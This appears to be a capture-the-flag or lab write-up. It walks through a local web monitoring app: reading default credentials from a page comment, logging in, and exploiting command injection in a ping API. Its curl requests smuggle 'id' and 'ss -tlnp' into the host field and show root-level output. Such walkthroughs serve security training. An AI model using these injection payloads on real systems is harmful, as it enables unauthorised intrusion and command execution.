# Finding the Bug

## Identify the application

Connect to the target and check what responds:

```bash
curl -v http://127.0.0.1:8081/
```

The server returns a redirect to `/login`. It is a web application running on port 8081.

## Discover the credentials

View the login page source:

```bash
curl -s http://127.0.0.1:8081/login
```

The HTML contains a comment:

```html
<!-- default credentials: admin / monitor123 -->
```

Credentials found without any brute-force.

## Log in and explore

Log in with the discovered credentials:

```bash
curl -c /tmp/jar -sf -X POST http://127.0.0.1:8081/login \
  -d "username=admin&password=monitor123"
curl -b /tmp/jar -s http://127.0.0.1:8081/dashboard
```

The dashboard shows monitored hosts and a "Ping Check" input. The input posts to `/api/ping` with a JSON body `{"host": "..."}`. The response includes the ping output verbatim.

## Confirm the injection point

Send a request with a valid host and observe that the full ping output is returned:

```bash
curl -b "auth=1" -s -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1"}'
```

The response contains ping statistics. Now test whether semicolons work:

```bash
curl -b "auth=1" -s -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1;id"}'
```

Output excerpt:

```
...
uid=0(root) gid=0(root) groups=0(root)
```

The injected `id` command ran. The process has root privileges inside the container.

## Enumerate internal services

Use the injection to list listening ports:

```bash
curl -b "auth=1" -s -X POST http://127.0.0.1:8081/api/ping \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1;ss -tlnp"}'
```

Output includes:

```
LISTEN 0  5  127.0.0.1:9090  0.0.0.0:*
LISTEN 0  5  0.0.0.0:8080    0.0.0.0:*
```

Port 9090 is bound to `127.0.0.1` only. It is not reachable from outside the container.
